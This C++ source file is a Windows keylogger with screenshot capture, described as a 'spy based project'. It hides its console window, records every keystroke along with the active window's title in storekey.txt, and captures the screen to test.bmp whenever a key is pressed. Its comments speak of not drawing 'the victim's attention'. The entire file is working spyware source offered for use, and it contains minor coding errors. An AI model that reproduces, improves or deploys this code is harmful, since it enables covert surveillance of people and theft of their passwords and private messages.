/*
Project  : Key Logger with Screen Shot
Review :  "KEY-LOGGER is basically a spy based project. Any key strokes entered
		by the user will  be stored in a file with the name of window it is working on.
		i have also Added Screen shot feature for further enchancement." 

*/

using namespace std;

void takeScreenShot_MSDN();

#include <windowsx.h>
#include <windows.h>
#include <fstream>
#include<iostream>
#include<string>

class in_main{
	protected :
		
 	public :
		void Stealth();
		void logger();
		
	
	~in_main()
	{
		//Destructor
		
	}
		
};


 


////////////////////////////


void  in_main :: Stealth()
{
HWND Stealth;// HWND = Handle WINDOWS 
AllocConsole(); //Allocates a new console for the calling process. FreeConsole(); to destroy it. 
Stealth = FindWindowA("ConsoleWindowClass", NULL);// Find the window handle with class name "ConsoleWindowClass".
ShowWindow(Stealth,FALSE); // False for close ...  true for open  ...  false means hide (exe)... \true means keep displaying(exe)

}




///////////////////////////////
string convertkey(int key)
{

	string keystring;

	switch(key)
	{

		case 8 :
		keystring = "[/]";
		break;

		case 13 :
		keystring = "\n";
		break;

		case 32 :
		keystring = " ";
		break;

		case 190 :
		keystring = ".";
		break;

		case 110 :
		keystring = ".";
		break;

		case VK_CAPITAL :
		keystring = "[CAPS LOCK]";
		break;
		
		case VK_TAB :
		keystring = "[TAB]";
		break;

		case VK_CONTROL :
		keystring = "[CONTROL]";
		break;

		case VK_ESCAPE :
		keystring = "[ESCAPE]";
		break;

		case VK_DOWN :
		keystring = "[DOWN]";
		break;

		case VK_LEFT :
		keystring = "[LEFT]";
		break;

		case VK_RIGHT :
		keystring = "[RIGHT]";
		break;

		case VK_UP :
		keystring = "[UP]";
		break;

	}

	if(key >= 96 && key <= 105)
	keystring = key-48;

	else if (key > 47 && key < 60)
	keystring = key;

	if (key != VK_LBUTTON || key != VK_RBUTTON)

	{

		if (key > 64 && key < 91)

		{

			if (GetKeyState(VK_CAPITAL) | GetAsyncKeyState(VK_SHIFT))
			keystring = key;                                   //if its capital then stay                              

			else

			{

				key = key + 32;                        //if not shift the number to the lowercase value                                
				keystring = key;

			}

		}		

	}

return keystring;

}





 ////////////////////////////////////////////////////////


void storekey(string key)
 {
 	try
	 {
 	
 		ofstream storekey; // writing
 		storekey.open("storekey.txt", ios :: app);
	 
	 
	 	if(!storekey)
	 	{
	 		throw "Sorry file cant be created " ;
	 	}
	
	 	storekey << key;
	 	storekey.close();
	 
	 }
	 
	 catch(const  char *str)
	 {
	 	cout << str;
	 	
	 }
}
 	
 
 	
 /////////////////////////////////////////////////////////////////
 
 
 //function to check whether key is pressed or not 

 //we have the program check all the keys for if they are pressed down Then we will know which key to log
 
 void  in_main :: logger()
 {
 	string keyinstring = "";
 	int key;
 	char currentwindowtitle[MAX_PATH];
 	char newwindowtitle[MAX_PATH];
 	GetWindowText(GetForegroundWindow(), currentwindowtitle, sizeof(currentwindowtitle));    
 	
 	while(true) // const while loop
 	{
 		Sleep(5); // Must not  take 100% of cpu to attract the victim's attention
 		
 		for( key = 8 ; key <=256 ; key++ ) //common ASCII values checker which checks whether key is pressed or not
 		{
 			
 			
 			if(GetAsyncKeyState(key) &1 == 1) // API to check for a  separate asynchronous key press
 			{
 				takeScreenShot_MSDN(); // Screen shot on same screen
 				GetWindowText(GetForegroundWindow(), currentwindowtitle, sizeof(currentwindowtitle));  
 			 
 				
				 // GetWindowText :Copies the text of the specified window's title bar (if it has one) into a buffer.   
 				// GetForegroundWindow: Retrieves a handle to the foreground window (the window with which the user is currently working)
 				
 				if (strcmp(newwindowtitle, currentwindowtitle) != 0) 
 				{
 					
 					/* irst, it initializes the currentwindowtitle variable with the current window, 
					 then every time it loops through, it checks if the new window is the same as the old window,
					  using the return value from the strcpy (string copy) function, and if it is different, then it outputs to the logfile. It also then changes the currentwindowtitle to the newtitle and then does it all over again*/
 					
 					
 					ofstream storekey("storekey.txt", ios::app);

					storekey << endl << currentwindowtitle << endl;

					storekey.close();

					strcpy(newwindowtitle, currentwindowtitle);
 				}
 				keyinstring = convertkey(key);
 				storekey(keyinstring);
 			
 			}
 			
 		}
 		
 	}
}


//////////////////////////////////////////////////

 
int main()
{
	
	in_main i;
	i.Stealth();
	i.logger();
	system("pause");
	return 1;
	
}

//// Takes one screen shot only ... 
void takeScreenShot_MSDN()
{
	 unsigned int cx = GetSystemMetrics(SM_CXSCREEN), cy = GetSystemMetrics(SM_CYSCREEN);
    HDC hScreenDC = ::GetDC(NULL);
    HDC hMemDC = CreateCompatibleDC(hScreenDC);
    HBITMAP hBitmap = CreateCompatibleBitmap(hScreenDC, cx, cy);
    HBITMAP hOldBitmap = (HBITMAP)SelectObject(hMemDC, hBitmap);
    BitBlt(hMemDC, 0, 0, cx, cy, hScreenDC, 0, 0, SRCCOPY);
    SelectObject(hMemDC, hOldBitmap);
    ::ReleaseDC(NULL, hScreenDC);
    
    size_t headerSize = sizeof(BITMAPINFOHEADER)+3*sizeof(RGBQUAD);
    BYTE* pHeader = new BYTE[headerSize];
    LPBITMAPINFO pbmi = (LPBITMAPINFO)pHeader;
    memset(pHeader, 0, headerSize);
    pbmi->bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
    pbmi->bmiHeader.biBitCount = 0;
    if (!GetDIBits(hMemDC, hBitmap, 0, 0, NULL, pbmi, DIB_RGB_COLORS))
        return;
    
    BITMAPFILEHEADER bmf;
    if (pbmi->bmiHeader.biSizeImage <= 0)
        pbmi->bmiHeader.biSizeImage=pbmi->bmiHeader.biWidth*abs(pbmi->bmiHeader.biHeight)*(pbmi->bmiHeader.biBitCount+7)/8;
    BYTE* pData = new BYTE[pbmi->bmiHeader.biSizeImage];
    bmf.bfType = 0x4D42; bmf.bfReserved1 = bmf.bfReserved2 = 0;
    bmf.bfSize = sizeof(BITMAPFILEHEADER)+ headerSize + pbmi->bmiHeader.biSizeImage;
    bmf.bfOffBits = sizeof(BITMAPFILEHEADER) + headerSize;
    if (!GetDIBits(hMemDC, hBitmap, 0, abs(pbmi->bmiHeader.biHeight), pData, pbmi, DIB_RGB_COLORS))
    {
        delete pData;
        return;
    }
    char strFilePath[90] = "test.bmp";
    FILE* hFile = fopen(strFilePath, "wb");
    fwrite(&bmf, sizeof(BITMAPFILEHEADER), 1, hFile);
    fwrite(pbmi, headerSize, 1, hFile);
    fwrite(pData, pbmi->bmiHeader.biSizeImage, 1, hFile);
    fclose(hFile);

    DeleteObject(hBitmap);
    DeleteDC(hMemDC);

    delete [] pData;

 
}


	
